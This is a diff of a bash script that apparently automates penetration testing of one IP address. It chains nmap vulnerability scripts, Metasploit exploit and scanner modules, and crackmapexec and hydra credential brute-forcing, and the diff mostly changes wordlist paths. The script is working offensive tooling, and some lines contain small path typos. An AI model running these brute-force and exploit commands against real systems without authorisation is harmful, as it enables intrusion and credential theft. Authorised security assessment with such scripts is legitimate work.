@@ -62,7 +62,7 @@ nmap --script "ftp-anon,ftp-vuln*,ftp-*" -p 21 "$IP" -oN $results_dir/ftp.txt
 msfconsole -q -x "use auxiliary/scanner/ftp/anonymous ; spool $results_dir/ftp_msf.txt; set rhosts $IP; set password anonymous; run ;spool off ; exit"
 
 nmap --script ssh-* -p 22 "$IP" | tee $results_dir/ssh_results
-crackmapexec ssh "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a $results_dir/ssh_results.txt
+crackmapexec ssh "$IP" -u '/home/vaptadmin/jai/usernames.txt' -p '/home/vaptadmin/jai/password.txt' 2>&1  | tee -a $results_dir/ssh_results.txt
 nmap -n --script "*telnet* and safe" -p 23 "$IP"  -oN $results_dir/telnet.txt
 nmap --script "smtp-brute,smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-vuln-cve2011-1764,smtp-*" -p 25,465,587  "$IP" | tee $results_dir/smtp.txt
 nmap -sU --script "ntp-info,ntp-monlist,ntp*,ntp* and (discovery or vuln) and not (dos or brute)" -p 123 $IP | tee -a $results_dir/ntp.txt
@@ -116,10 +116,10 @@ smbmap -H $IP -R | tee -a $results_dir/SMB_overall_results.txt
 # -L: List shared directories
 smbclient -N -L $results_dir/list_hosts | tee -a $results_dir/SMB_overall_results.txt
 # Execute a command
-smbmap -u username -p password --host-file $results_dir/list_hosts -x 'ipconfig' | tee -a $results_dir/SMB_overall_results.txt
+#smbmap -u username -p password --host-file $results_dir/list_hosts -x 'ipconfig' | tee -a $results_dir/SMB_overall_results.txt
 # Find aother user
 crackmapexec smb $IP -u /home/vaptadmin/jai/usernames.txt -p /home/vaptadmin/jai/password.txt --users | tee -a $results_dir/SMB_overall_results.txt
-#crackmapexec smb $IP -u users.txt -p password --continue-on-success | tee -a $results_dir/SMB_overall_results.txt
+#crackmapexec smb $IP -u /home/vaptadmin/jai/usernames.txt -p /home/vaptadmin/jai/password.txt --continue-on-success | tee -a $results_dir/SMB_overall_results.txt
 #Perform RID cycling attack against a DC with SMB null sessions allowed with impacket-lookupsid
 # Anonymous logon
 # 20000: Maximum RID to be cycled
@@ -149,7 +149,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}+-----------------------------------+${RESET}"
   
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP | tee $results_dir/mssql_results.txt
-crackmapexec mssql "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a $results_dir/mssql_results.txt
+crackmapexec mssql "$IP" -u '/home/vaptadmin/jai/usernames.txt' -p '/home/vaptadmin/jai/password.txt' 2>&1  | tee -a $results_dir/mssql_results.txt
 
 echo -e $RED_LINE
 
@@ -235,8 +235,8 @@ msfconsole -q -x "use exploit/linux/http/docker_daemon_tcp; spool $results_dir/d
 #5432,5433 - Postgresql
 nmap --script pgsql-brute -p 5432 $IP |  tee  $results_dir/Postgresql.txt
 #Brute Force Credentials
-hydra -l username -P passwords.txt $IP postgres |  tee -a  $results_dir/Postgresql.txt
-hydra -L usernames.txt -p password $IP postgres |  tee -a $results_dir/Postgresql.txt
+#hydra -l username -P passwords.txt $IP postgres |  tee -a  $results_dir/Postgresql.txt
+hydra -L/home/vaptadmin/jai/usernames.txt -P /home/vaptadmin/jai/password.txt $IP postgres |  tee -a $results_dir/Postgresql.txt
 #Argument injection vulnerability (CVE-2013-1899)
 msfconsole -q -x "use auxiliary/scanner/postgres/postgres_dbname_flag_injection; spool $results_dir/postgresql_msf_cve.txt; set rhost $IP; run; spool off ; exit"
 
@@ -247,7 +247,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 
-echo "$IP" | httpx -p '80,81,82,90,443,444,446,447,448,449,450,451,1947,5000,5800,8000,8443,8080,8081,8089,8888,1072,1556,1947,2068,2560,3128,3172,3387,3580,3582,3652,4343,4480,5000, 
+echo "$IP" | /home/vaptadmin/jai/tools/./httpx -p '80,81,82,90,443,444,446,447,448,449,450,451,1947,5000,5800,8000,8443,8080,8081,8089,8888,1072,1556,1947,2068,2560,3128,3172,3387,3580,3582,3652,4343,4480,5000, 
 5800,5900,5985,5986,8001,8030,8082,8083,8088,8089,8090,8443,8444,8445,8910,9001,9090,9091,20000' --title --status-code --content-type -td -cdn --server| tee $results_dir/httpxresults.txt
 
 #Noise remove from httpx results
@@ -259,8 +259,8 @@ echo -e $RED_LINE
   echo -e "${GREEN}|           web service             |${RESET}"
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
-cat $results_dir/nmap_tcp_scan.xml | nmapurls | tee $results_dir/nmap_webservice_results.txt
-cat $results_dir/nmap_tcp_scan.xml | nmapurls | tee -a n$results_dir/map_webservice_results.txt
+#cat $results_dir/nmap_tcp_scan.xml | nmapurls | tee $results_dir/nmap_webservice_results.txt
+cat $results_dir/nmap_tcp_scan.xml | /home/vaptadmin/jai/tools/./tew | tee -a n$results_dir/map_webservice_results.txt
 cat $results_dir/httpx_without_noise.txt nmap_webservice_results.txt | anew | tee $results_dir/httpx.txt
 
 echo -e $RED_LINE
@@ -270,7 +270,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 
-cat $results_dir/httpx.txt | nuclei | tee $results_dir/nucleiresults.txt
+cat $results_dir/httpx.txt | /home/vaptadmin/jai/tools/./nuclei | tee $results_dir/nucleiresults.txt
 
 echo -e $RED_LINE
 
